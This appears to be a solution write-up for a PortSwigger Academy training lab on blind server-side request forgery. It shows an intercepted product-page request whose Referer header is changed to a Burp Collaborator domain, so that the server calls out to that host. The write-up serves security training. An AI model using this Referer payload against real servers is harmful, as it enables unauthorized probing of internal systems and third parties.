
# Blind SSRF with out-of-band detection

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/ssrf



![img](images/Blind%20SSRF%20with%20out-of-band%20detection/1.png)

---------------------------------------------

Intercept the request when clicking a product and change the “Referer” header:

```
GET /product?productId=1 HTTP/2
...
Referer: http://snjtorvmsesj9itkltcgrqtsfjla92xr.oastify.com
...
```



![img](images/Blind%20SSRF%20with%20out-of-band%20detection/2.png)


There are DNS and HTTP request to the Collaborator domain:



![img](images/Blind%20SSRF%20with%20out-of-band%20detection/3.png)